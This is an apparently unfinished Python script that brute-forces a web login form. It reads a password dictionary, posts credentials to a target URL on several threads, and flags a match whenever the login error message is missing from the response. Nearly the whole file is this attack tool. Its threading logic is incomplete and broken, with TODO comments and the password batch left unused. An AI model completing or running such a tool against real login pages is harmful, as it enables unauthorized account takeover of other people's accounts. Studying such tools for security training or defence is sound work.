import requests, re, sys, argparse, threading
from itertools import islice

DEFAULT_THREAD_NO = 10
thread_count = None
args = None


def parse_arguments():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", type=str, action="store", required=True, help="specify target URL")
    parser.add_argument("-d", "--dict", type=str, action="store", required=True, help="specify dictionary path")
    parser.add_argument("--data", type=str, action="store", required=True, help="specify POST form data")
    parser.add_argument("-m", "--message", type=str, action="store", required=True, help="specify login error message "
                                                                                         "(used to check for a "
                                                                                         "password match)")
    parser.add_argument("-t", "--threads", type=int, action="store", required=False, help="specify number of threads "
                                                                                          "to use")
    args = parser.parse_args()


"""
Craft POST request and send it; Check response body for login error message;
If the message is not present then a match was found.
"""
def crack(pURL, pData):
    global args

    r = requests.post(url=pURL, data=pData)
    reg = re.search(args.message, r.text)

    if reg is None:  # If the login error message is not read
        print("[+] Found possible match: " + str(pData) + "\n")
        return True

    return False


def main():
    global thread_count, args
    if not args.threads:
        thread_count = DEFAULT_THREAD_NO
        print("[!] Thread count not specified, running with default thread count [" + str(thread_count) + "] \n")
    else:
        thread_count = int(args.threads)
        print("[!] Running with specified thread count [" + str(thread_count) + "] \n")

    threads = []  # List of threads
    for i in range(thread_count):  # Create 'thread_count' thread objects with appropriate target function & arguments
        threads.append(threading.Thread(target=crack, args=args.url))

    # Replace

    # TODO: read through all passwords in the dictionary file in batches of 'thread_count' items
    with open(args.dict, 'r') as infile:
        # 'passwords' is a generator object, can be used in a loop
        passwords_batch = islice(infile, thread_count)
        for i in range(thread_count):
            threads[i].start()
        # TODO: make function to craft POST request

    # TODO: try one request with password per thread
    # TODO: wait for threads to stop (.join())
    # TODO: process next batch of passwords


if __name__ == '__main__':
    parse_arguments()
    main()
